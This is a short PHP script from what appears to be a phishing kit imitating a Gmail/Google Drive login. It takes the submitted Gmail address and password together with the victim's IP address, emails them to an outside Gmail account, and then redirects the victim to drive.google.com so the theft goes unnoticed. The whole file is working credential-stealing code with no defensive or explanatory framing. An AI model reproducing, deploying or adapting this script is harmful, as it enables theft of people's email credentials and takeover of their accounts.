<?
$ip = getenv("REMOTE_ADDR");
$message .= "----------Gmail Webmail--------------------\n";
$message .= "Gmail Email Address: ".$_POST['GmailAddress']."\n";
$message .= "Gmail Password: ".$_POST['Passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Seknano---------------------\n";
$send = "getemdogg@gmail.com";
$subject = "drive";
$headers = "From: greecypr<gree-cyprus.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://drive.google.com");
	  

?>